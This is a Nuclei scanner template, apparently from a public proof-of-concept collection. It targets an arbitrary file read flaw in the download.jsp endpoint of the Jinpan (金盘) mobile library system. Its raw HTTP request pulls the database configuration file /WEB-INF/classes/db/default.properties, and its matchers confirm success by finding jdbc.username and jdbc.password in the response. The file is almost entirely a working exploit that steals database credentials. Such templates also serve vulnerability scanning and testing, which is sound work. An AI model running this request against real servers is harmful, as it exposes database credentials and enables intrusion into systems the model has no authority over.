id: goldlib-download-fileread
info:
  name: 金盘移动图书馆系统 download.jsp - fileread
  author: leadlife
  severity: critical
  description: 金盘移动图书馆系统download.jsp存在任意文件读取漏洞，通过该漏洞读取数据库配置文件等
  reference: 
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E7%9B%98/%E9%87%91%E7%9B%98%E7%A7%BB%E5%8A%A8%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%B3%BB%E7%BB%9Fdownload.jsp%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
  tags: goldlib,fileread

http:
  - raw:
      - |
        GET /pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/db/default.properties HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Cookie: JSESSIONID=D8C7BD39FAF4DD095FBBB0E87FB017C5
        Connection: close
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'jdbc.username','jdbc.password')
        condition: and